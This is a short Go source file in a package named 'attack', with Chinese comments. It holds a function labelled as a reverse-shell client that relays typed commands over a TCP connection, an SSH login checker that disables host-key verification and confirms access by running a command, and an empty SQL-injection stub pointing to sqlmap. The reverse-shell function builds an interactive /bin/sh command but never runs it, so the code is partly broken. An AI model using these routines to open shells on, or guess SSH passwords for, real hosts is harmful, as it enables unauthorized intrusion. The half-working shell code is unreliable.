package attack

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

func ReverseShellClient() {
	conn, err := net.Dial("tcp", ":30002")
	if err != nil {
		fmt.Println("err : ", err)
		return
	}
	defer conn.Close()
	inputReader := bufio.NewReader(os.Stdin)
	for {
		input, _ := inputReader.ReadString('\n')
		fmt.Println("輸入命令:", input)
		if strings.ToUpper(input) == "Q\n" {
			return
		}

		_, writeErr := conn.Write([]byte(input)) //Send Command Line
		if writeErr != nil {
			return
		}
		buf := [512]byte{}

		var stderr bytes.Buffer
		cmd := exec.Command("/bin/sh", "-i")
		cmd.Stderr = &stderr

		readlens, readErr := conn.Read(buf[:])
		if readErr != nil {
			fmt.Println("recv failed, err:", readErr)
			return
		}
		fmt.Println(string(buf[:readlens]))
	}
}

// SSHLogin 嘗試登入SSH
func SSHLogin(ip, username, password string) (bool, error) {
	success := false
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout:         3 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", ip, 22), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		errRet := session.Run("echo 123456")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success, err
}

// SQL 注入攻擊
func SQLinjection() {
	//https://blog.csdn.net/weixin_45100742/article/details/130165374
	//還是用工具[sqlmap]就好
}
